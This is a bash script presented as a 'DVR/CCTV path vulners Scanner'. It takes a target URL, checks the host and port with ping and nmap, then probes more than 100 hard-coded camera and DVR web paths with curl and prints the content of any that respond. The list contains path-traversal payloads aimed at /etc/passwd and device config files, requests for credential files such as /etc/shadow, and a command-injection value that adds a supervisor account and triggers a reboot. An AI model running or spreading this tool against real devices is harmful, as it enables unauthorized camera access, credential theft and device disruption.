#!/bin/bash
# what you do, it's your RESPONSIBILITY

name=$(uname -n)
YELLOW=$(tput setaf 3)
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
BLUE=$(tput setaf 4)
GGG=$(tput setaf 5)
CYN=$(tput setaf 7)
STAND=$(tput sgr 0)
BOLD=$(tput bold)
pwd=$(pwd)



#if [[ $EUID -ne 0 ]]; then
#    echo -e "run script with$BOLD$RED ROOT$STAND. exp:$BOLD$RED sudo bash$STAND <script>"
#    echo -e "$BOLD$RED\aSUDO$STAND <script>"
#    exit 1
#fi



#clear
echo "
  ┳━┓  ┓ ┳  ┳━┓      ┏━┓  ┏━┓  ┏┓┓  ┓ ┳
  ┃ ┃  ┃┏┛  ┃┳┛  ━━  ┃    ┃     ┃   ┃┏┛
  ┇━┛  ┗┛   ┇┗┛      ┗━┛  ┗━┛   ┇   ┗┛ " | lolcat -p 0.7
echo -e "                            by-$BOLD rouze_d$STAND"
echo -e "$BLUE DVR/CCTV path vulners Scanner$STAND"
echo ""

echo -e " Enter full URL target exp: http://174.57.211.80:81"
echo -e "$GREEN :$STAND \c"
read target0

target=`echo $target0 | cut -d '/' -f 3 | cut -d ':' -f 1`
port=`echo $target0 | cut -d '/' -f 3 | cut -d ':' -f 2`

echo ""
for target1 in `ping $target -c 1 | head -n1 | grep PING | cut -d '(' -f 2 | cut -d ')' -f 1`
do
    if [ $target1 = $target1 ];then
        #for port1 in `hping3 --scan $port -S $target1 | grep http | cut -d 'h' -f 1` --fix for scan open port
        #for port1 in `hping3 --scan $port -S $target1 | grep -E '\.S\.'\|'\.A\.'\|'http'\|'\.\.' | grep ':' | cut -d ':' -f 1 | cut -d ' ' -f 2,4`
        for port1 in `nmap -p $port $target -Pn --system-dns | grep open | grep $port`
        do
        if [ $port1 = $port1 ];then
            echo ""
            echo " Looding target.. $target1:$port"
            echo -e " Press Enter for$BOLD$GREEN continue$STAND.. \c"
            read attack
            echo " "
            for ffile in `cat<<"EOT"
/anony/mjpg.cgi
/../../../../../../../boot.ini
/camera-cgi/public/getSysteminfo.cgi
/cgi-bin/admin/getparam.cgi
/cgi-bin/camera_privacy_area
/cgi-bin/conf/recv_ip_filtering.py
/cgi-bin/dev_camera
/cgi-bin/dev_devinfo
/cgi-bin/dev_devinfo2
/cgi-bin/dev_hddalarm
/cgi-bin/dev_modechange
/cgi-bin/dev_monitor
/cgi-bin/dev_pos
/cgi-bin/dev_ptz
/cgi-bin/dev_remote
/cgi-bin/dev_spotout
/cgi-bin/event_alarmsched
/cgi-bin/event_motion_area
/cgi-bin/event_motiondetect
/cgi-bin/event_sensordetect
/cgi-bin/event_tamper
/cgi-bin/event_vldetect
/cgi-bin/guest/Login.cgi
/cgi-bin/mft/manufacture.cgi
/cgi-bin/mft/wireless_mft.cgi
/cgi-bin/net_callback
/cgi-bin/net_connmode
/cgi-bin/net_ddns
/cgi-bin/net_event
/cgi-bin/net_group
/cgi-bin/net_imagetrans
/cgi-bin/net_recipient
/cgi-bin/net_server
/cgi-bin/net_snmp
/cgi-bin/net_transprotocol
/cgi-bin/net_user
/cgi-bin/nobody/Machine.cgi
/cgi-bin/nobody/Machine.cgi?action=get_capability
/cgi-bin/nobody/Search.cgi
/cgi-bin/nobody/VerifyCode.cgi
/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4K=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc
/cgi-bin/passwd.cgi?
/cgi-bin/read.cgi?page=2
/cgi-bin/rec_event
/cgi-bin/rec_eventrecduration
/cgi-bin/rec_normal
/cgi-bin/rec_recopt
/cgi-bin/rec_recsched
/cgi-bin/restart_page
/cgi-bin/setup_admin_setup
/cgi-bin/setup_datetimelang
/cgi-bin/setup_group
/cgi-bin/setup_holiday
/cgi-bin/setup_ntp
/cgi-bin/setup_systeminfo
/cgi-bin/setup_user
/cgi-bin/setup_userpwd
/cgi-bin/supervisor/adcommand.cgi
/cgi-bin/supervisor/CloudSetup.cgi
/cgi-bin/supervisor/PwdGrp.cgi
/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN
/cgi-bin/user/Config.cgi
/cgi-bin/util/passwords.py
/cgi-bin/util/ziplogs.py?filename=../../html/logs
/cgi-bin/wapopen?FILECAMERA=../../../etc/passwd
/cgi-bin/wappwd?FILEFAIL=../../../etc/passwd
/cgi-bin/webviewer
/check_user.cgi
/Config.cgi?cmd=system_info
/credenciales
/dbconfig.ini
/device.rsp?opt=user&cmd=list
/DVR.cfg
/dvr.ini
/dvr/wwwroot/user.cgi
/etc/shadow
/frame.cgi?page=DevStatus
/frame/GetConfig
/get_camera_params.cgi
/get_status.cgi
/img/main.cgi?next_file=main.htm
/Level1Authenticate.htm
/log/syslog.txt
/logs.zip
/../../../mnt/mtd/config/config.dat
/monitor2.htm
/monitor.htm
/network.html
/Net_work.xml
/ntp.cgi
/password.htm
/password.htm?parm1=&parm2=1
//proc/kcore
/public/dvrlog
/public/index.htm
/public/UpgradeHistory.htm
/public/UpgradeHistory.txt
/public/UpgradeStatus.htm
/public/UpgradeStatus.html
/scripts/logfiles.tar.gz
/system.html
/system.ini?loginuse&loginpas
/System.xml
/tlogin.cgi
/tlogin.txt
/tmpfs/syslog.txt
/UserAuthenticate.htm
/User.cgi?cmd=get_user
/../../var/run/vy_netman.cfg
/video.h264
/view2.html
/webcmd.html
EOT
`
            do
                lolo=`curl --connect-timeout 3 -m 3 -s -k $target0$ffile -I | head -n1 | grep 200`
                if [ "$?" != 0 ];then
                echo -e "\r$BLUE $target0$ffile <- 404 Not Found"
                    else
                echo ""
                echo -e "$STAND ===================================="
                echo -e "$GREEN $target0$ffile <- Yehh.. maybe this is.."
                echo ""
                curl --connect-timeout 30 -m 30 -s -k $target0$ffile | strings
                echo -e "$STAND ===================================="
                echo ""
                fi
            done
            echo -e "$STAND"
            echo ""
            echo -e " Thank You. Have a Nice Day."
            exit

        fi
        done
    echo ""
    echo -e " hallo $name,"
    echo " $target$GREEN UP$STAND but port $port is$RED CLOSED!$STAND"
    echo ""
    exit
    fi
done
echo ""
echo -e " hallo $name,"
echo " error Target. $target is$RED DOWN!$STAND"
echo ""
exit
